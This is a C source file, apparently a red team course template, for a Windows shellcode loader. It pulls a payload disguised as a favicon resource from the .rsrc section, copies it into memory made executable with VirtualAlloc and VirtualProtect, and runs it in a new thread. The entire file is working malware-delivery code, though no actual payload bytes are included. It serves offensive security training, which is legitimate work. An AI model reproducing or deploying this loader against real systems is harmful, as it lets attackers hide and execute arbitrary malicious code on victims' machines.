/*

 Red Team Operator course code template
 storing payload in .rsrc section
 
 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resources.h"

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char * payload;
	unsigned int payload_len;
	
	// Extract payload from resources section
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	payload = (char *) LockResource(resHandle);
	payload_len = SizeofResource(NULL, res);
	
	// Allocate some memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	// Copy payload to new memory buffer
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me!\n");
	getchar();

	// Launch the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
